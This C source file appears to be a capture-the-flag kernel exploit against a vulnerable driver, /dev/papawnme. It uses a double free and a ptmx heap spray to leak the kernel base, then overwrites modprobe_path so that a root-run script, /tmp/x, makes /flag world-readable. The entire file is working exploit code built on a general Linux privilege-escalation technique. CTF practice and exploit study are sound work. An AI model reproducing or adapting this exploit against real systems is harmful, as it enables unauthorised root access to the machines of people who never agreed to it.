// gcc -static exploit.c -o exploit
// current ara infra
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>

typedef struct param{
    size_t idx;
    size_t size;
    char *buf;
} param;

int spray[0x200];

unsigned long leak, kbase, probe;

/*
double free & arbitrary write
*/

int main(){
	// setup the modprobe payload
	system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    	system("chmod +x /tmp/x");
    	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    	system("chmod +x /tmp/dummy");

	param heap;
	int fd = open("/dev/papawnme", O_RDWR);
	// leak setup & leak 101
	heap.idx = 0;
	heap.size = 0x30;
	heap.buf = malloc(0x30);
	memset(heap.buf, 'A', 0x28);
	ioctl(fd, 0x1770, (unsigned long)&heap);

	free(heap.buf);
	heap.buf = malloc(0x90);
	heap.idx = 0;
	heap.size = 0x90;
	        
        for (int i = 0; i < 0x100; i++) {
                spray[i] = open("/dev/ptmx", O_NOCTTY | O_RDONLY);
        }
	ioctl(fd, 0x1771, (unsigned long)&heap);
	ioctl(fd, 0x1772, (unsigned long)&heap);

	for(int i = 16; i < 0x100; i+=8){
               printf("idx %d w val 0x%llx\n", i, *(long long *) (heap.buf+i));
        }

	//leak = *(long long *) (heap.buf+104);
	//kbase = leak - 0x151f3c0L;
	leak = *(long long *) (heap.buf+120);
	kbase = leak - 0x5b3aeL; // dapet dari remote leaking 3x jalan biar valie
	probe = kbase + 0x14447a0L;
        printf("[+] Leaked 0x%llx\n", leak);
        printf("[+] Base 0x%llx\n", kbase);
        printf("[+] modprobe_path 0x%llx\n", probe);
	// leaked setup end

	// setup for bypassing double free detection & double free
	free(heap.buf);
	heap.buf = malloc(0x30);
	heap.size = 0x30;

	heap.idx=0;
	puts("[+] setup double free for arbitrary write!");
	
	heap.size = 0x30;
	heap.idx = 1;
	ioctl(fd, 0x1770, (unsigned long)&heap); // goes to 0 and 1;
	ioctl(fd, 0x1770, (unsigned long)&heap);

	heap.idx = 0;

	free(heap.buf);
	heap.buf = malloc(0x30);
	memset(heap.buf, 'B', 0x30);
	heap.size = 0x30;
	ioctl(fd, 0x1770, (unsigned long)&heap);
	ioctl(fd, 0x1770, (unsigned long)&heap);
	
	puts("[+] Triggering double free again & arbitrary write!");
	heap.idx = 0;
	ioctl(fd, 0x1771, (unsigned long)&heap); // trigger
	ioctl(fd, 0x1771, (unsigned long)&heap);

	// the slab memory is fooked up!
	heap.idx = 0;
	free(heap.buf);
        heap.buf = malloc(0x30);
        memset(heap.buf, 0, 0x30);
        int f = 0;
        unsigned long *pawn2 = (unsigned long*) (heap.buf);
        pawn2[f++] = probe;
        pawn2[f++] = probe;
	//pawn2[f++] = 0xffffffff822d12e0;
	//pawn2[f++] = 0xffffffff822d12e0;
	ioctl(fd, 0x1770, (unsigned long)&heap); // after the double double free, what you kmalloc next will kmalloc based on what you previously filled

	int k = 0;
	free(heap.buf);
	heap.buf = malloc(0x30);
	memset(heap.buf, 0, 0x30);

	unsigned long *papawn2 = (unsigned long*) (heap.buf);
        papawn2[k++] = 0x0000782f706d742f; // /tmp/x
	//papawn2[k++] = 0x0000782f706d742f; // incase satu ga kena
	
	heap.idx = 1;
	ioctl(fd, 0x1770, (unsigned long)&heap);
	ioctl(fd, 0x1770, (unsigned long)&heap); // and goes to modprobe :D

	close(fd);
	printf("run the /tmp/dummy and profit!\n");
}
